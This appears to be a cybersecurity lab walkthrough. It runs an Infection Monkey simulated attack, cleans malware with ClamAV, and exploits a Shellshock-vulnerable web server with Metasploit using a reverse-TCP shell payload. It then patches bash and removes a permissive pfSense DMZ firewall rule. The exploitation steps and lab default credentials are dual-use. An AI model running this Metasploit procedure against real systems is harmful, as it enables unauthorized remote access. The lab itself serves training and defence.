
# Introduction

- **Reconnaissance** is the initiation of the hacking process. Reconnaissance refers to the act of inspecting or exploring target systems. It may also be referred to as footprinting, discovery, research, or information gathering.  
- **Scanning** is the process of using various tools to confirm information learned during reconnaissance and to discover new details. Scanning is aimed at discovering live and active systems.  
- **Enumeration** is the process of discovering and identifying potential attack targets. The output of the Enumeration phase should include sufficient details about a potential target for determining whether it may be vulnerable to a specific exploitation.  
- **Attacking** is the execution of the attack. While this step seems to be the phase that attracts most of the hype, it is the briefest phase of the overall hacking process.  
- **Post-Attack Activity** occurs after a successful attack, when the hacker usually has breached the target’s security to gain some level of logical access. If the attack is unsuccessful, the attacker may instead revert to fallback attacks.

# Section 1

<u>Part 1 - Perform a Simulated Attack with Infection Monkey</u>

On the vWorkstation taskbar, **click** the **Chrome icon** to launch the Chrome web browser.

SS1

In the Chrome navigation bar, **type https://172.40.0.50:5000** and **press Enter** to access the Infection Monkey interface.

SS2

On the Infection Monkey home page, **click** **Configure Monkey** to open the Monkey Configuration page.

SS3

On the Monkey Configuration page, **click** the **Exploits tab** to view a list of exploits that Infection Monkey is able to perform.

SS4

On the Monkey Configuration page, **click** the **Network** **tab** to view Infection Monkey’s network-related settings.

SS5

On the Monkey Configuration page, **click** the **Monkey tab** to view the configuration options for post-breach activities.

SS6

On the Monkey Configuration page, **click** the **Internal tab** to view the advanced configuration settings.

SS7

From the left-hand panel, **click Run Monkey** to display the run options for Infection Monkey.

SS8

On the Run Monkey page, **click** **Run on Monkey Island Server** to initiate the attack on the DMZ from the Monkey Island C&C server.

From the left-hand panel, **click Infection Map** to display the Monkey’s progress.

SS9

On the Infection Map page, **click** the **corporationtechs.com icon** to display more information about the Infection Monkey’s actions on that particular machine.

In the right-hand pane, **scroll down** to the **EXPLOIT TIMELINE** section.

*Scroll through the EXPLOIT TIMELINE to review the attempted exploits on the machine. Each item on the timeline shows the time the exploit was tried, which machine it was tried from, and the name of the exploit module. A red circle to the left of the exploit indicates it was successful.*

In the left-hand pane, **click** **Security Reports** to access a detailed summary of Infection Monkey’s attack.

SS10

On the Security report page, **scroll down** and **review** the **recommendations for the corporationtechs.com web server**.

SS11

On the Security report page, **click** the **Att&ck report** tab to view the Att&ck techniques matrix.

In the Att&ck report tab, **click** the **_Remote file copy_ square** to learn more about the related actions taken performed.

SS12

<u>Part 2 - Use Antivirus Software to Remove Malicious Files</u>

On the Lab View toolbar, **select TargetLinux01** from the Virtual Machine menu to connect to the TargetLinux01 system.

*TargetLinux01 is a web server that hosts the corporationtechs.com website*

From the Application bar, **click** the **Terminal icon** to open the Terminal client.

At the command prompt, **type clamscan -h** and **press Enter** to display the help manual for ClamAV.

```bash
clamscan -h
```

At the command prompt, **type clamscan -r ./** and **press Enter** to run an antivirus scan.

SS13

*When the scan is complete, the Scan summary will indicate that there are two infected files. However, you would need to review the entire output to identify names and locations of the infected files. In the next step, you will a second scan and add an option that will prevent un-infected files from being reported*

At the command prompt, **type clamscan -ri ./** and **press Enter** to run a recursive scan of the entire computer (**r**), identifying only infecting files (**i**).

SS14

SS15

At the command prompt, **type cd ~/** and **press Enter** to ensure you are at the user’s home directory.

At the command prompt, **type mkdir VIRUS** and **press Enter** to create a directory named VIRUS

At the command prompt, **type ls -l** and **press Enter** to confirm that the VIRUS directory exists.

SS16

At the command prompt, **type clamscan -ri --move=/home/user/VIRUS ./** and **press Enter** to run a recursive scan of the entire computer (**r**), identifying only infecting files (**i**), and place all found into the VIRUS directory (**--move**).

SS17

SS18

At the command prompt, **type ls ./Music** and **press Enter** to confirm that the Music directory is now empty.

At the command prompt, **type ls ./VIRUS** and **press Enter** to confirm that the VIRUS directory now contains the two infected files.

SS19

# Section 2

<u>Part 1 - Exploit a Vulnerable Web Server with Metasploit</u>

**Connect** to the **AttackLinux01 machine** and **sign in** using the following credentials:

```bash
Username: root
Password: toor
```

On the AttackLinxu01 menu bar, **click** the **Activities menu**, then **click** the **Metasploit icon** to open the Metasploit framework.

SS20

*This shortcut will open a Terminal window, initialize the Metasploit database, and invoke the msfconsole, from which you will configure and launch your exploit.*

At the msf5 prompt, **execute search shellshock** to query the msf database for all available exploits concerning shellshock.

```msf5
search shellshock
```

At the msf5 prompt, **execute use 5** to select the apache_mod_cgi_bash_env_exec as your exploit module of choice.

SS21

SS22

At the msf5 prompt, **execute info** to display information about the Shellshock vulnerability.

*The info command will provide additional information, as well as hyper-linked references, about the selected exploit.*

At the msf5 prompt, **execute show options** to display the various parameters for the execution.

SS23

There are three parameters required for this exploit:  
- remote host (RHOST)
- listening host (LHOST)
- path to the CGI script to be run (TARGETURI)

At the msf5 prompt, **execute set RHOST 172.40.0.20** to set the remote host parameter.

SS24

At the msf5 prompt, **execute set LHOST 10.0.1.3** to set the listening host.

SS25

At the msf5 prompt, **execute set TARGETURI cgi-bin/test-cgi.sh** to set the target URI (Uniform Resource Identifier).

SS26

*The TargetURI is / (the root directory) by default. Information on the location of the CGI script in the web server’s file structure would typically be gained in advance of the attack by performing reconnaissance on the target. In this case, you have discovered the script is called test-cgi.sh, and is located in the cgi-bin directory.*

At the msf5 prompt, **execute show options** and to verify your new settings.

SS27

At the msf5 prompt, **execute show payloads** to determine the available payload within the Metasploit Framework.

*A payload consists of code that will run on the server once a successful exploit has been achieved. It will dictate what actions you can perform on your newly exploited machine.*

At the msf5 prompt, **execute use 26** to select the linux/x86/shell/reverse_tcp payload.

SS28

Once the machine has been exploited, this payload will establish a reverse shell connection to the listening host over the TCP protocol.

Optionally, you may set a payload explicitly using the set PAYLOAD <path/payloadname> command. This would be desirable if you have created a custom payload for the attack, or require one that is not listed. For example, all of the payloads here are specific to x86 architecture, meaning they are intended for 32-bit operating systems. To use the 64-bit version, you would type _set PAYLOAD linux/x64/shell/reverse_tcp_ instead (assuming such a module exists).

The target machine is running a 64-bit operating system; however, in this case, the architecture will not affect the success of the payload execution, so you will stick with the x86 version.

At the msf5 prompt, **execute check** to gauge the readiness of the exploit, as well as the vulnerability of the target machine.

SS29

At the msf5 prompt, **execute exploit** to initiate the exploit using the parameter values you configured, and the payload you selected.

SS30

Meterpreter is the interactive shell established by your shell/reverse_tcp payload, and it should have launched from the directory you specified for the test-cgi.sh file.

At the Meterpreter prompt, **execute ls** to list the contents of the current directory.

SS31

At the Meterpreter prompt, **execute exit** to kill the shell connection and return to the msfconsole.

Keep the Terminal window open, as you will use it in the next part to verify your patch on the corporationtechs.com web server.

<u>Part 2 - Patch the Exploited System</u>

**Connect** to the **TargetLinux01 machine**.

**Open** a new **Terminal window**.

At the command prompt, **execute bash –version** to display the currently installed version of bash.

SS32

At the command prompt, **execute cd Downloads** to navigate to the /home/user/Downloads director

At the command prompt, **execute ls** to confirm a Debian package file (.deb) for Bash exists in the Downloads directory.

SS33

At the command prompt, **execute sudo dpkg -i bash_5.0-6ubuntu1_amd64.deb** and **press** **Enter** to install (**-i**) the bash package using the Debian Package Manager (**dpkg**).

Using the sudo command invokes the super user prompt at the command line. When prompted for a password, use the following: **P@ssw0rd!**

SS34

**Execute the command** to view the currently installed version of Bash.

SS35

**Connect** to the **AttackLinux01** machine.

At the msf5 prompt, **execute check** to determine if the target machine is still vulnerable to ShellShock.

SS36

At the msf5 prompt, **execute exploit** to re-attempt the ShellShock exploit on the target machine

SS37

# Section 3

<u>Part 1 - Run an Antivirus Scan on the vWorkstation</u>

*Your direct supervisor is concerned with vulnerabilities with the vWorkstation on the internal network. It has been determined through log analysis that the machine has been accessed remotely by non-authorized personnel. You recall from your vulnerability scanning and exploit attempt through Infection Monkey that the vWorkstation was also compromised and a malicious file was copied to it from Monkey Island.*

On the vWorkstation, access the Infection Monkey web interface (172.40.0.50:5000) and inspect the Monkey Configuration to identify the location of the file that was remotely copied to the vWorkstation.

```cmd
C:\Users\Administrator\Pictures\eicar.com
```

SS38

Using Windows Virus and Threat Protection, execute a Custom scan on the folder containing the file identified above. Use the Internet as necessary to research how to perform this action.

SS39

SS40

SS41

<u>Part 2 - Harden the Network Perimeter</u>

*Now it is time for you to address a larger problem: unwarranted access from the DMZ to the internal network. It is not unusual for machines on the internal network to have access to the DMZ hosts, as the machines hosted in a de-militarized zone often need to be accessed by both internal and external users. However, it is unusual (and extremely poor security posture) to allow inbound access to the internal network from the DMZ. The DMZ is intended to provide residence to internal hosts that need to be accessed by external users, but without compromising the security of the internal network. By allowing access from the DMZ to the internal network, you render it pointless, now providing hackers the ability to easily pivot into the internal network it was constructed to protect. You know the DMZ in this network is defined at the edge firewall, which you recall is a pfSense firewall appliance located at 172.30.0.1. pfSense has a web interface (called the WebGUI) that allows you to configure it in the browser by simply navigating to that IP address. Furthermore, you know that the access from the DMZ is governed by rules on the DMZ interface on the pfSense machine. If you could just log in to the pfSense webGUI and remove the permissive rule on the DMZ interface, you should be able to quickly remedy the segmentation problem and harden the network’s security posture.*

From the vWorkstation, access the pfSense WebGUI from the Firefox web browser at http://172.30.0.1. You can log in using the following credentials:

```cmd
Username: admin
Password: pfsense
```

SS42

Once you have access, locate the offending firewall rule on the DMZ interface, remove it, and apply your changes. Use the Internet as necessary to determine how to remove firewall rules from an interface in pfSense.

SS43

